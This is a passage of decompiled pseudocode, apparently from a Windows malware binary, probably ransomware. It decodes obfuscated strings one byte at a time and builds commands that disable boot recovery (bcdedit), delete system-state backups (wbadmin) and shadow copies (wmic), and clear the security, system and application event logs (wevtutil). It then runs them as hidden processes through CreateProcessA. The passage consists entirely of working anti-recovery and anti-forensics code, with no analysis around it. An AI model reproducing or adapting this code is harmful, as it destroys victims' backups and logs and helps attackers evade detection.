LOBYTE(STACK[0x573]) = sub_401120(&STACK[0x564], 116);\n          LOBYTE(STACK[0x574]) = sub_401120(&STACK[0x564], 32);\n          LOBYTE(STACK[0x575]) = sub_401120(&STACK[0x564], 123);\n          LOBYTE(STACK[0x576]) = sub_401120(&STACK[0x564], 100);\n          LOBYTE(STACK[0x577]) = sub_401120(&STACK[0x564], 101);\n          LOBYTE(STACK[0x578]) = sub_401120(&STACK[0x564], 102);\n          LOBYTE(STACK[0x579]) = sub_401120(&STACK[0x564], 97);\n          LOBYTE(STACK[0x57A]) = sub_401120(&STACK[0x564], 117);\n          LOBYTE(STACK[0x57B]) = sub_401120(&STACK[0x564], 108);\n          LOBYTE(STACK[0x57C]) = sub_401120(&STACK[0x564], 116);\n          LOBYTE(STACK[0x57D]) = sub_401120(&STACK[0x564], 125);\n          LOBYTE(STACK[0x57E]) = sub_401120(&STACK[0x564], 32);\n          LOBYTE(STACK[0x57F]) = sub_401120(&STACK[0x564], 98);\n          LOBYTE(STACK[0x580]) = sub_401120(&STACK[0x564], 111);\n          LOBYTE(STACK[0x581]) = sub_401120(&STACK[0x564], 111);\n          LOBYTE(STACK[0x582]) = sub_401120(&STACK[0x564], 116);\n          LOBYTE(STACK[0x583]) = sub_401120(&STACK[0x564], 115);\n          LOBYTE(STACK[0x584]) = sub_401120(&STACK[0x564], 116);\n          LOBYTE(STACK[0x585]) = sub_401120(&STACK[0x564], 97);\n          LOBYTE(STACK[0x586]) = sub_401120(&STACK[0x564], 116);\n          LOBYTE(STACK[0x587]) = sub_401120(&STACK[0x564], 117);\n          LOBYTE(STACK[0x588]) = sub_401120(&STACK[0x564], 115);\n          LOBYTE(STACK[0x589]) = sub_401120(&STACK[0x564], 112);\n          LOBYTE(STACK[0x58A]) = sub_401120(&STACK[0x564], 111);\n          LOBYTE(STACK[0x58B]) = sub_401120(&STACK[0x564], 108);\n          LOBYTE(STACK[0x58C]) = sub_401120(&STACK[0x564], 105);\n          LOBYTE(STACK[0x58D]) = sub_401120(&STACK[0x564], 99);\n          LOBYTE(STACK[0x58E]) = sub_401120(&STACK[0x564], 121);\n          LOBYTE(STACK[0x58F]) = sub_401120(&STACK[0x564], 32);\n          LOBYTE(STACK[0x590]) = sub_401120(&STACK[0x564], 105);\n          LOBYTE(STACK[0x591]) = sub_401120(&STACK[0x564], 103);\n          LOBYTE(STACK[0x592]) = sub_401120(&STACK[0x564], 110);\n          LOBYTE(STACK[0x593]) = sub_401120(&STACK[0x564], 111);\n          LOBYTE(STACK[0x594]) = sub_401120(&STACK[0x564], 114);\n          LOBYTE(STACK[0x595]) = sub_401120(&STACK[0x564], 101);\n          LOBYTE(STACK[0x596]) = sub_401120(&STACK[0x564], 97);\n          LOBYTE(STACK[0x597]) = sub_401120(&STACK[0x564], 108);\n          LOBYTE(STACK[0x598]) = sub_401120(&STACK[0x564], 108);\n          LOBYTE(STACK[0x599]) = sub_401120(&STACK[0x564], 102);\n          LOBYTE(STACK[0x59A]) = sub_401120(&STACK[0x564], 97);\n          LOBYTE(STACK[0x59B]) = sub_401120(&STACK[0x564], 105);\n          LOBYTE(STACK[0x59C]) = sub_401120(&STACK[0x564], 108);\n          LOBYTE(STACK[0x59D]) = sub_401120(&STACK[0x564], 117);\n          LOBYTE(STACK[0x59E]) = sub_401120(&STACK[0x564], 114);\n          LOBYTE(STACK[0x59F]) = sub_401120(&STACK[0x564], 101);\n          LOBYTE(STACK[0x5A0]) = sub_401120(&STACK[0x564], 115);\n          v536 = 0;\n          LOBYTE(STACK[0x5A1]) = 0;\n          do\n          {\n            v587 = *sub_401010((char *)&STACK[0x565], v536);\n            v537 = sub_401010((char *)&STACK[0x565], v536++);\n            *v537 = sub_401120(&STACK[0x564], v587);\n          }\n          while ( v536 < 0x3C );\n          *sub_401010((char *)&STACK[0x565], 60) = 0;\n          STACK[0x860] = (unsigned int)sub_401000(&STACK[0x565]);\n          LOBYTE(STACK[0x490]) = 50;\n          LOBYTE(STACK[0x491]) = sub_401120(&STACK[0x490], 47);\n          LOBYTE(STACK[0x492]) = sub_401120(&STACK[0x490], 99);\n          LOBYTE(STACK[0x493]) = sub_401120(&STACK[0x490], 32);\n          LOBYTE(STACK[0x494]) = sub_401120(&STACK[0x490], 119);\n          LOBYTE(STACK[0x495]) = sub_401120(&STACK[0x490], 98);\n          LOBYTE(STACK[0x496]) = sub_401120(&STACK[0x490], 97);\n          LOBYTE(STACK[0x497]) = sub_401120(&STACK[0x490], 100);\n          LOBYTE(STACK[0x498]) = sub_401120(&STACK[0x490], 109);\n          LOBYTE(STACK[0x499]) = sub_401120(&STACK[0x490], 105);\n          LOBYTE(STACK[0x49A]) = sub_401120(&STACK[0x490], 110);\n          LOBYTE(STACK[0x49B]) = sub_401120(&STACK[0x490], 32);\n          LOBYTE(STACK[0x49C]) = sub_401120(&STACK[0x490], 68);\n          LOBYTE(STACK[0x49D]) = sub_401120(&STACK[0x490], 69);\n          LOBYTE(STACK[0x49E]) = sub_401120(&STACK[0x490], 76);\n          LOBYTE(STACK[0x49F]) = sub_401120(&STACK[0x490], 69);\n          LOBYTE(STACK[0x4A0]) = sub_401120(&STACK[0x490], 84);\n          LOBYTE(STACK[0x4A1]) = sub_401120(&STACK[0x490], 69);\n          LOBYTE(STACK[0x4A2]) = sub_401120(&STACK[0x490], 32);\n          LOBYTE(STACK[0x4A3]) = sub_401120(&STACK[0x490], 83);\n          LOBYTE(STACK[0x4A4]) = sub_401120(&STACK[0x490], 89);\n          LOBYTE(STACK[0x4A5]) = sub_401120(&STACK[0x490], 83);\n          LOBYTE(STACK[0x4A6]) = sub_401120(&STACK[0x490], 84);\n          LOBYTE(STACK[0x4A7]) = sub_401120(&STACK[0x490], 69);\n          LOBYTE(STACK[0x4A8]) = sub_401120(&STACK[0x490], 77);\n          LOBYTE(STACK[0x4A9]) = sub_401120(&STACK[0x490], 83);\n          LOBYTE(STACK[0x4AA]) = sub_401120(&STACK[0x490], 84);\n          LOBYTE(STACK[0x4AB]) = sub_401120(&STACK[0x490], 65);\n          LOBYTE(STACK[0x4AC]) = sub_401120(&STACK[0x490], 84);\n          LOBYTE(STACK[0x4AD]) = sub_401120(&STACK[0x490], 69);\n          LOBYTE(STACK[0x4AE]) = sub_401120(&STACK[0x490], 66);\n          LOBYTE(STACK[0x4AF]) = sub_401120(&STACK[0x490], 65);\n          LOBYTE(STACK[0x4B0]) = sub_401120(&STACK[0x490], 67);\n          LOBYTE(STACK[0x4B1]) = sub_401120(&STACK[0x490], 75);\n          LOBYTE(STACK[0x4B2]) = sub_401120(&STACK[0x490], 85);\n          LOBYTE(STACK[0x4B3]) = sub_401120(&STACK[0x490], 80);\n          v538 = 0;\n          LOBYTE(STACK[0x4B4]) = 0;\n          do\n          {\n            v588 = *sub_401010((char *)&STACK[0x491], v538);\n            v539 = sub_401010((char *)&STACK[0x491], v538++);\n            *v539 = sub_401120(&STACK[0x490], v588);\n          }\n          while ( v538 < 0x23 );\n          *sub_401010((char *)&STACK[0x491], 35) = 0;\n          STACK[0x85C] = (unsigned int)sub_401000(&STACK[0x491]);\n          LOBYTE(STACK[0x531]) = 38;\n          LOBYTE(STACK[0x532]) = sub_401120(&STACK[0x531], 47);\n          LOBYTE(STACK[0x533]) = sub_401120(&STACK[0x531], 99);\n          LOBYTE(STACK[0x534]) = sub_401120(&STACK[0x531], 32);\n          LOBYTE(STACK[0x535]) = sub_401120(&STACK[0x531], 119);\n          LOBYTE(STACK[0x536]) = sub_401120(&STACK[0x531], 98);\n          LOBYTE(STACK[0x537]) = sub_401120(&STACK[0x531], 97);\n          LOBYTE(STACK[0x538]) = sub_401120(&STACK[0x531], 100);\n          LOBYTE(STACK[0x539]) = sub_401120(&STACK[0x531], 109);\n          LOBYTE(STACK[0x53A]) = sub_401120(&STACK[0x531], 105);\n          LOBYTE(STACK[0x53B]) = sub_401120(&STACK[0x531], 110);\n          LOBYTE(STACK[0x53C]) = sub_401120(&STACK[0x531], 32);\n          LOBYTE(STACK[0x53D]) = sub_401120(&STACK[0x531], 68);\n          LOBYTE(STACK[0x53E]) = sub_401120(&STACK[0x531], 69);\n          LOBYTE(STACK[0x53F]) = sub_401120(&STACK[0x531], 76);\n          LOBYTE(STACK[0x540]) = sub_401120(&STACK[0x531], 69);\n          LOBYTE(STACK[0x541]) = sub_401120(&STACK[0x531], 84);\n          LOBYTE(STACK[0x542]) = sub_401120(&STACK[0x531], 69);\n          LOBYTE(STACK[0x543]) = sub_401120(&STACK[0x531], 32);\n          LOBYTE(STACK[0x544]) = sub_401120(&STACK[0x531], 83);\n          LOBYTE(STACK[0x545]) = sub_401120(&STACK[0x531], 89);\n          LOBYTE(STACK[0x546]) = sub_401120(&STACK[0x531], 83);\n          LOBYTE(STACK[0x547]) = sub_401120(&STACK[0x531], 84);\n          LOBYTE(STACK[0x548]) = sub_401120(&STACK[0x531], 69);\n          LOBYTE(STACK[0x549]) = sub_401120(&STACK[0x531], 77);\n          LOBYTE(STACK[0x54A]) = sub_401120(&STACK[0x531], 83);\n          LOBYTE(STACK[0x54B]) = sub_401120(&STACK[0x531], 84);\n          LOBYTE(STACK[0x54C]) = sub_401120(&STACK[0x531], 65);\n          LOBYTE(STACK[0x54D]) = sub_401120(&STACK[0x531], 84);\n          LOBYTE(STACK[0x54E]) = sub_401120(&STACK[0x531], 69);\n          LOBYTE(STACK[0x54F]) = sub_401120(&STACK[0x531], 66);\n          LOBYTE(STACK[0x550]) = sub_401120(&STACK[0x531], 65);\n          LOBYTE(STACK[0x551]) = sub_401120(&STACK[0x531], 67);\n          LOBYTE(STACK[0x552]) = sub_401120(&STACK[0x531], 75);\n          LOBYTE(STACK[0x553]) = sub_401120(&STACK[0x531], 85);\n          LOBYTE(STACK[0x554]) = sub_401120(&STACK[0x531], 80);\n          LOBYTE(STACK[0x555]) = sub_401120(&STACK[0x531], 32);\n          LOBYTE(STACK[0x556]) = sub_401120(&STACK[0x531], 45);\n          LOBYTE(STACK[0x557]) = sub_401120(&STACK[0x531], 100);\n          LOBYTE(STACK[0x558]) = sub_401120(&STACK[0x531], 101);\n          LOBYTE(STACK[0x559]) = sub_401120(&STACK[0x531], 108);\n          LOBYTE(STACK[0x55A]) = sub_401120(&STACK[0x531], 101);\n          LOBYTE(STACK[0x55B]) = sub_401120(&STACK[0x531], 116);\n          LOBYTE(STACK[0x55C]) = sub_401120(&STACK[0x531], 101);\n          LOBYTE(STACK[0x55D]) = sub_401120(&STACK[0x531], 79);\n          LOBYTE(STACK[0x55E]) = sub_401120(&STACK[0x531], 108);\n          LOBYTE(STACK[0x55F]) = sub_401120(&STACK[0x531], 100);\n          LOBYTE(STACK[0x560]) = sub_401120(&STACK[0x531], 101);\n          LOBYTE(STACK[0x561]) = sub_401120(&STACK[0x531], 115);\n          LOBYTE(STACK[0x562]) = sub_401120(&STACK[0x531], 116);\n          v540 = 0;\n          LOBYTE(STACK[0x563]) = 0;\n          do\n          {\n            v589 = *sub_401010((char *)&STACK[0x532], v540);\n            v541 = sub_401010((char *)&STACK[0x532], v540++);\n            *v541 = sub_401120(&STACK[0x531], v589);\n          }\n          while ( v540 < 0x31 );\n          *sub_401010((char *)&STACK[0x532], 49) = 0;\n          STACK[0x854] = (unsigned int)sub_401000(&STACK[0x532]);\n          LOBYTE(STACK[0x46D]) = 43;\n          LOBYTE(STACK[0x46E]) = sub_401120(&STACK[0x46D], 47);\n          LOBYTE(STACK[0x46F]) = sub_401120(&STACK[0x46D], 99);\n          LOBYTE(STACK[0x470]) = sub_401120(&STACK[0x46D], 32);\n          LOBYTE(STACK[0x471]) = sub_401120(&STACK[0x46D], 119);\n          LOBYTE(STACK[0x472]) = sub_401120(&STACK[0x46D], 109);\n          LOBYTE(STACK[0x473]) = sub_401120(&STACK[0x46D], 105);\n          LOBYTE(STACK[0x474]) = sub_401120(&STACK[0x46D], 99);\n          LOBYTE(STACK[0x475]) = sub_401120(&STACK[0x46D], 32);\n          LOBYTE(STACK[0x476]) = sub_401120(&STACK[0x46D], 83);\n          LOBYTE(STACK[0x477]) = sub_401120(&STACK[0x46D], 72);\n          LOBYTE(STACK[0x478]) = sub_401120(&STACK[0x46D], 65);\n          LOBYTE(STACK[0x479]) = sub_401120(&STACK[0x46D], 68);\n          LOBYTE(STACK[0x47A]) = sub_401120(&STACK[0x46D], 79);\n          LOBYTE(STACK[0x47B]) = sub_401120(&STACK[0x46D], 87);\n          LOBYTE(STACK[0x47C]) = sub_401120(&STACK[0x46D], 67);\n          LOBYTE(STACK[0x47D]) = sub_401120(&STACK[0x46D], 79);\n          LOBYTE(STACK[0x47E]) = sub_401120(&STACK[0x46D], 80);\n          LOBYTE(STACK[0x47F]) = sub_401120(&STACK[0x46D], 89);\n          LOBYTE(STACK[0x480]) = sub_401120(&STACK[0x46D], 32);\n          LOBYTE(STACK[0x481]) = sub_401120(&STACK[0x46D], 47);\n          LOBYTE(STACK[0x482]) = sub_401120(&STACK[0x46D], 110);\n          LOBYTE(STACK[0x483]) = sub_401120(&STACK[0x46D], 111);\n          LOBYTE(STACK[0x484]) = sub_401120(&STACK[0x46D], 105);\n          LOBYTE(STACK[0x485]) = sub_401120(&STACK[0x46D], 110);\n          LOBYTE(STACK[0x486]) = sub_401120(&STACK[0x46D], 116);\n          LOBYTE(STACK[0x487]) = sub_401120(&STACK[0x46D], 101);\n          LOBYTE(STACK[0x488]) = sub_401120(&STACK[0x46D], 114);\n          LOBYTE(STACK[0x489]) = sub_401120(&STACK[0x46D], 97);\n          LOBYTE(STACK[0x48A]) = sub_401120(&STACK[0x46D], 99);\n          LOBYTE(STACK[0x48B]) = sub_401120(&STACK[0x46D], 116);\n          LOBYTE(STACK[0x48C]) = sub_401120(&STACK[0x46D], 105);\n          LOBYTE(STACK[0x48D]) = sub_401120(&STACK[0x46D], 118);\n          LOBYTE(STACK[0x48E]) = sub_401120(&STACK[0x46D], 101);\n          v542 = 0;\n          LOBYTE(STACK[0x48F]) = 0;\n          do\n          {\n            v590 = *sub_401010((char *)&STACK[0x46E], v542);\n            v543 = sub_401010((char *)&STACK[0x46E], v542++);\n            *v543 = sub_401120(&STACK[0x46D], v590);\n          }\n          while ( v542 < 0x21 );\n          *sub_401010((char *)&STACK[0x46E], 33) = 0;\n          STACK[0x858] = (unsigned int)sub_401000(&STACK[0x46E]);\n          LOBYTE(STACK[0x3A7]) = 21;\n          LOBYTE(STACK[0x3A8]) = sub_401120(&STACK[0x3A7], 47);\n          LOBYTE(STACK[0x3A9]) = sub_401120(&STACK[0x3A7], 99);\n          LOBYTE(STACK[0x3AA]) = sub_401120(&STACK[0x3A7], 32);\n          LOBYTE(STACK[0x3AB]) = sub_401120(&STACK[0x3A7], 119);\n          LOBYTE(STACK[0x3AC]) = sub_401120(&STACK[0x3A7], 101);\n          LOBYTE(STACK[0x3AD]) = sub_401120(&STACK[0x3A7], 118);\n          LOBYTE(STACK[0x3AE]) = sub_401120(&STACK[0x3A7], 116);\n          LOBYTE(STACK[0x3AF]) = sub_401120(&STACK[0x3A7], 117);\n          LOBYTE(STACK[0x3B0]) = sub_401120(&STACK[0x3A7], 116);\n          LOBYTE(STACK[0x3B1]) = sub_401120(&STACK[0x3A7], 105);\n          LOBYTE(STACK[0x3B2]) = sub_401120(&STACK[0x3A7], 108);\n          LOBYTE(STACK[0x3B3]) = sub_401120(&STACK[0x3A7], 32);\n          LOBYTE(STACK[0x3B4]) = sub_401120(&STACK[0x3A7], 99);\n          LOBYTE(STACK[0x3B5]) = sub_401120(&STACK[0x3A7], 108);\n          LOBYTE(STACK[0x3B6]) = sub_401120(&STACK[0x3A7], 32);\n          LOBYTE(STACK[0x3B7]) = sub_401120(&STACK[0x3A7], 115);\n          LOBYTE(STACK[0x3B8]) = sub_401120(&STACK[0x3A7], 101);\n          LOBYTE(STACK[0x3B9]) = sub_401120(&STACK[0x3A7], 99);\n          LOBYTE(STACK[0x3BA]) = sub_401120(&STACK[0x3A7], 117);\n          LOBYTE(STACK[0x3BB]) = sub_401120(&STACK[0x3A7], 114);\n          LOBYTE(STACK[0x3BC]) = sub_401120(&STACK[0x3A7], 105);\n          LOBYTE(STACK[0x3BD]) = sub_401120(&STACK[0x3A7], 116);\n          LOBYTE(STACK[0x3BE]) = sub_401120(&STACK[0x3A7], 121);\n          v544 = 0;\n          LOBYTE(STACK[0x3BF]) = 0;\n          do\n          {\n            v591 = *sub_401010((char *)&STACK[0x3A8], v544);\n            v545 = sub_401010((char *)&STACK[0x3A8], v544++);\n            *v545 = sub_401120(&STACK[0x3A7], v591);\n          }\n          while ( v544 < 0x17 );\n          *sub_401010((char *)&STACK[0x3A8], 23) = 0;\n          STACK[0x850] = (unsigned int)sub_401000(&STACK[0x3A8]);\n          LOBYTE(STACK[0x390]) = 12;\n          LOBYTE(STACK[0x391]) = sub_401120(&STACK[0x390], 47);\n          LOBYTE(STACK[0x392]) = sub_401120(&STACK[0x390], 99);\n          LOBYTE(STACK[0x393]) = sub_401120(&STACK[0x390], 32);\n          LOBYTE(STACK[0x394]) = sub_401120(&STACK[0x390], 119);\n          LOBYTE(STACK[0x395]) = sub_401120(&STACK[0x390], 101);\n          LOBYTE(STACK[0x396]) = sub_401120(&STACK[0x390], 118);\n          LOBYTE(STACK[0x397]) = sub_401120(&STACK[0x390], 116);\n          LOBYTE(STACK[0x398]) = sub_401120(&STACK[0x390], 117);\n          LOBYTE(STACK[0x399]) = sub_401120(&STACK[0x390], 116);\n          LOBYTE(STACK[0x39A]) = sub_401120(&STACK[0x390], 105);\n          LOBYTE(STACK[0x39B]) = sub_401120(&STACK[0x390], 108);\n          LOBYTE(STACK[0x39C]) = sub_401120(&STACK[0x390], 32);\n          LOBYTE(STACK[0x39D]) = sub_401120(&STACK[0x390], 99);\n          LOBYTE(STACK[0x39E]) = sub_401120(&STACK[0x390], 108);\n          LOBYTE(STACK[0x39F]) = sub_401120(&STACK[0x390], 32);\n          LOBYTE(STACK[0x3A0]) = sub_401120(&STACK[0x390], 115);\n          LOBYTE(STACK[0x3A1]) = sub_401120(&STACK[0x390], 121);\n          LOBYTE(STACK[0x3A2]) = sub_401120(&STACK[0x390], 115);\n          LOBYTE(STACK[0x3A3]) = sub_401120(&STACK[0x390], 116);\n          LOBYTE(STACK[0x3A4]) = sub_401120(&STACK[0x390], 101);\n          LOBYTE(STACK[0x3A5]) = sub_401120(&STACK[0x390], 109);\n          v546 = 0;\n          LOBYTE(STACK[0x3A6]) = 0;\n          do\n          {\n            v592 = *sub_401010((char *)&STACK[0x391], v546);\n            v547 = sub_401010((char *)&STACK[0x391], v546++);\n            *v547 = sub_401120(&STACK[0x390], v592);\n          }\n          while ( v546 < 0x15 );\n          *sub_401010((char *)&STACK[0x391], 21) = 0;\n          STACK[0x864] = (unsigned int)sub_401000(&STACK[0x391]);\n          LOBYTE(STACK[0x3F3]) = 70;\n          LOBYTE(STACK[0x3F4]) = sub_401120(&STACK[0x3F3], 47);\n          LOBYTE(STACK[0x3F5]) = sub_401120(&STACK[0x3F3], 99);\n          LOBYTE(STACK[0x3F6]) = sub_401120(&STACK[0x3F3], 32);\n          LOBYTE(STACK[0x3F7]) = sub_401120(&STACK[0x3F3], 119);\n          LOBYTE(STACK[0x3F8]) = sub_401120(&STACK[0x3F3], 101);\n          LOBYTE(STACK[0x3F9]) = sub_401120(&STACK[0x3F3], 118);\n          LOBYTE(STACK[0x3FA]) = sub_401120(&STACK[0x3F3], 116);\n          LOBYTE(STACK[0x3FB]) = sub_401120(&STACK[0x3F3], 117);\n          LOBYTE(STACK[0x3FC]) = sub_401120(&STACK[0x3F3], 116);\n          LOBYTE(STACK[0x3FD]) = sub_401120(&STACK[0x3F3], 105);\n          LOBYTE(STACK[0x3FE]) = sub_401120(&STACK[0x3F3], 108);\n          LOBYTE(STACK[0x3FF]) = sub_401120(&STACK[0x3F3], 32);\n          LOBYTE(STACK[0x400]) = sub_401120(&STACK[0x3F3], 99);\n          LOBYTE(STACK[0x401]) = sub_401120(&STACK[0x3F3], 108);\n          LOBYTE(STACK[0x402]) = sub_401120(&STACK[0x3F3], 32);\n          LOBYTE(STACK[0x403]) = sub_401120(&STACK[0x3F3], 97);\n          LOBYTE(STACK[0x404]) = sub_401120(&STACK[0x3F3], 112);\n          LOBYTE(STACK[0x405]) = sub_401120(&STACK[0x3F3], 112);\n          LOBYTE(STACK[0x406]) = sub_401120(&STACK[0x3F3], 108);\n          LOBYTE(STACK[0x407]) = sub_401120(&STACK[0x3F3], 105);\n          LOBYTE(STACK[0x408]) = sub_401120(&STACK[0x3F3], 99);\n          LOBYTE(STACK[0x409]) = sub_401120(&STACK[0x3F3], 97);\n          LOBYTE(STACK[0x40A]) = sub_401120(&STACK[0x3F3], 116);\n          LOBYTE(STACK[0x40B]) = sub_401120(&STACK[0x3F3], 105);\n          LOBYTE(STACK[0x40C]) = sub_401120(&STACK[0x3F3], 111);\n          LOBYTE(STACK[0x40D]) = sub_401120(&STACK[0x3F3], 110);\n          v548 = 0;\n          LOBYTE(STACK[0x40E]) = 0;\n          do\n          {\n            v593 = *sub_401010((char *)&STACK[0x3F4], v548);\n            v549 = sub_401010((char *)&STACK[0x3F4], v548++);\n            *v549 = sub_401120(&STACK[0x3F3], v593);\n          }\n          while ( v548 < 0x1A );\n          *sub_401010((char *)&STACK[0x3F4], 26) = 0;\n          STACK[0xC80] = (unsigned int)lpProcName;\n          STACK[0xC84] = STACK[0x660];\n          STACK[0xC88] = STACK[0x860];\n          STACK[0xC8C] = STACK[0x85C];\n          STACK[0xC90] = STACK[0x854];\n          STACK[0xC94] = STACK[0x858];\n          STACK[0xC98] = STACK[0x850];\n          STACK[0xC9C] = STACK[0x864];\n          STACK[0xCA0] = (unsigned int)sub_401000(&STACK[0x3F4]);\n          v550 = 0;\n          STACK[0xCA4] = 0;\n          v551 = 0;\n          for ( TickCount = 0; ; v550 = TickCount )\n          {\n            if ( !*(&STACK[0xC80] + v551) )\n            {\n              v551 = 0;\n              TickCount = v550 + 1;\n              if ( v550 == (char *)1 )\n                break;\n            }\n            STACK[0xFE8] = 68;\n            *(_QWORD *)&STACK[0xFEC] = 0i64;\n            *(_QWORD *)&STACK[0xFF4] = 0i64;\n            *(_QWORD *)&STACK[0xFFC] = 0i64;\n            *(_QWORD *)&STACK[0x1004] = 0i64;\n            *(_QWORD *)&STACK[0x100C] = 0i64;\n            *(_QWORD *)&STACK[0x1014] = 0i64;\n            *(_QWORD *)&STACK[0x101C] = 0i64;\n            *(_QWORD *)&STACK[0x1024] = 0i64;\n            *(_OWORD *)&STACK[0xF98] = 0i64;\n            sub_40CC00(&STACK[0x1330], 0, 0x104u);\n            v552 = (const void *)*(&STACK[0xC80] + v551);\n            if ( v552 )\n              v553 = sub_40CD50((_BYTE *)*(&STACK[0xC80] + v551));\n            else\n              v553 = 0;\n            sub_40CBE0(&STACK[0x1330], v552, v553 + 1);\n            ++v551;\n            if ( CreateProcessA(\n                   (LPCSTR)&STACK[0x5A3],\n                   (LPSTR)&STACK[0x1330],\n                   0,\n                   0,\n                   1,\n                   0x8000000u,\n                   0,\n                   0,\n                   (LPSTARTUPINFOA)&STACK[0xFE8],\n                   (LPPROCESS_INFORMATION)&STACK[0xF98]) )\n            {\n              CloseHandle((HANDLE)STACK[0xF98]);\n              CloseHandle((HANDLE)STACK[0xF9C]);\n            }\n            sub_40CD60(0x64u);\n          }\n          LOBYTE(STACK[0x4B5]) = 18;\n          LOBYTE(STACK[0x4B6]) = sub_401120(&STACK[0x4B5], 86);\n          LOBYTE(STACK[0x4B7]) = sub_401120(&STACK[0x4B5], 111);\n          LOBYTE(STACK[0x4B8]) = sub_401120(&STACK[0x4B5], 108);\n          LOBYTE(STACK[0x4B9]) = sub_401120(&STACK[0x4B5], 117);\n          LOBYTE(STACK[0x4BA]) = sub_401120(&STACK[0x4B5], 109);\n          LOBYTE(STACK[0x4BB]) = sub_401120(&STACK[0x4B5], 101);\n          LOBYTE(STACK[0x4BC]) = sub_401120(&STACK[0x4B5], 32);\n          LOBYTE(STACK[0x4BD]) = sub_401120(&STACK[0x4B5], 83);\n          LOBYTE(STACK[0x4BE]) = sub_401120(&STACK[0x4B5], 104);\n          LOBYTE(STACK[0x4BF]) = sub_401120(&STACK[0x4B5], 97);\n          LOBYTE(STACK[0x4C0]) = sub_401120(&STACK[0x4B5], 100);\n          LOBYTE(STACK[0x4C1]) = sub_401120(&STACK[0x4B5], 111);\n          LOBYTE(STACK[0x4C2]) = sub_401120(&STACK[0x4B5], 119);\n          LOBYTE(STACK[0x4C3]) = sub_401120(&STACK[0x4B5], 32);\n          LOBYTE(STACK[0x4C4]) = sub_401120(&STACK[0x4B5], 67);\n          LOBYTE(STACK[0x4C5]) = sub_401120(&STACK[0x4B5], 111);\n          LOBYTE(STACK[0x4C6]) = sub_401120(&STACK[0x4B5], 112);\n          LOBYTE(STACK[0x4C7]) = sub_401120(&STACK[0x4B5], 121);\n          LOBYTE(STACK[0x4C8]) = sub_401120(&STACK[0x4B5], 32);\n          LOBYTE(STACK[0x4C9]) = sub_401120(&STACK[0x4B5], 38);\n          LOBYTE(STACK[0x4CA]) = sub_401120(&STACK[0x4B5], 32);\n          LOBYTE(STACK[0x4CB]) = sub_401120(&STACK[0x4B5], 69);\n          LOBYTE(STACK[0x4CC]) = sub_401120(&STACK[0x4B5], 118);\n          LOBYTE(STACK[0x4CD]) = sub_401120(&STACK[0x4B5], 101);\n          LOBYTE(STACK[0x4CE]) = sub_401120(&STACK[0x4B5], 110);\n          LOBYTE(STACK[0x4CF]) = sub_401120(&STACK[0x4B5], 116);\n          LOBYTE(STACK[0x4D0]) = sub_401120(&STACK[0x4B5], 32);\n          LOBYTE(STACK[0x4D1]) = sub_401120(&STACK[0x4B5], 108);\n          LOBYTE(STACK[0x4D2]) = sub_401120(&STACK[0x4B5], 111);\n          LOBYTE(STACK[0x4D3]) = sub_401120(&STACK[0x4B5], 103);\n          LOBYTE(STACK[0x4D4]) = sub_401120(&STACK[0x4B5], 32);\n          LOBYTE(STACK[0x4D5]) = sub_401120(&STACK[0x4B5], 99);\n          LOBYTE(STACK[0x4D6]) = sub_401120(&STACK[0x4B5], 108);\n          LOBYTE(STACK[0x4D7]) = sub_401120(&STACK[0x4B5], 101);\n          LOBYTE(STACK[0x4D8]) = sub_401120(&STACK[0x4B5], 97);\n          LOBYTE(STACK[0x4D9]) = sub_401120(&STACK[0x4B5], 110);\n          v554 = 0;\n          LOBYTE(STACK[0x4DA]) = 0;\n          do\n          {\n            v594 = *sub_401010((char *)&STACK[0x4B6], v554);\n            v555 = sub_401010((char *)&STACK[0x4B6], v554++);\n            *v555 = sub_401120(&STACK[0x4B5], v594);\n          }\n          while ( v554 < 0x24 );\n          *sub_401010((char *)&STACK[0x4B6], 36) = 0;\n          v556 = (const CHAR *)sub_401000(&STACK[0x4B6]);\n          v557 = sub_40A0B0(v556);\n          LOWORD(v557) = __GS__;\n          if ( v557 )\n          {\n            LOBYTE(STACK[0x42E]) = 117;\n            LOBYTE(STACK[0x42F]) = sub_401120(&STACK[0x42E], 87);\n            LOBYTE(STACK[0x430]) = sub_401120(&STACK[0x42E], 111);\n            LOBYTE(STACK[0x431]) = sub_401120(&STACK[0x42E], 119);\n            LOBYTE(STACK[0x432]) = sub_401120(&STACK[0x42E], 54);\n            LOBYTE(STACK[0x433]) = sub_401120(&STACK[0x42E], 52);\n            LOBYTE(STACK[0x434]) = sub_401120(&STACK[0x42E], 82);\n            LOBYTE(STACK[0x435]) = sub_401120(&STACK[0x42E], 101);\n            LOBYTE(STACK[0x436]) = sub_401120(&STACK[0x42E], 118);\n            LOBYTE(STACK[0x437]) = sub_401120(&STACK[0x42E], 101);\n            LOBYTE(STACK[0x438]) = sub_401120(&STACK[0x42E], 114);\n            LOBYTE(STACK[0x439]) = sub_401120(&STACK[0x42E], 116);\n            LOBYTE(STACK[0x43A]) = sub_401120(&STACK[0x42E], 87);\n            LOBYTE(STACK[0x43B]) = sub_401120(&STACK[0x42E], 111);\n            LOBYTE(STACK[0x43C]) = sub_401120(&STACK[0x42E], 119);\n            LOBYTE(STACK[0x43D]) = sub_401120(&STACK[0x42E], 54);\n            LOBYTE(STACK[0x43E]) = sub_401120(&STACK[0x42E], 52);\n            LOBYTE(STACK[0x43F]) = sub_401120(&STACK[0x42E], 70);\n            LOBYTE(STACK[0x440]) = sub_401120(&STACK[0x42E], 115);\n            LOBYTE(STACK[0x441]) = sub_401120(&STACK[0x42E], 82);\n            LOBYTE(STACK[0x442]) = sub_401120(&STACK[0x42E], 101);\n            LOBYTE(STACK[0x443]) = sub_401120(&STACK[0x42E], 100);\n            LOBYTE(STACK[0x444]) = sub_401120(&STACK[0x42E], 105);\n            LOBYTE(STACK[0x445]) = sub_401120(&STACK[0x42E], 114);\n            LOBYTE(STACK[0x446]) = sub_401120(&STACK[0x42E], 101);\n            LOBYTE(STACK[0x447]) = sub_401120(&STACK[0x42E], 99);\n            LOBYTE(STACK[0x448]) = sub_401120(&STACK[0x42E], 116);\n            LOBYTE(STACK[0x449]) = sub_401120(&STACK[0x42E], 105);\n            LOBYTE(STACK[0x44A]) = sub_401120(&STACK[0x42E], 111);\n            LOBYTE(STACK[0x44B]) = sub_401120(&STACK[0x42E], 110);\n            v558 = 0;\n            LOBYTE(STACK[0x44C]) = 0;\n            do\n            {\n              v595 = *sub_401010((char *)&STACK[0x42F], v558);\n              v559 = sub_401010((char *)&STACK[0x42F], v558++);\n              *v559 = sub_401120(&STACK[0x42E], v595);\n            }\n            while ( v558 < 0x1D );\n            *sub_401010((char *)&STACK[0x42F], 29) = 0;\n            lpProcName = (LPCSTR)sub_401000(&STACK[0x42F]);\n            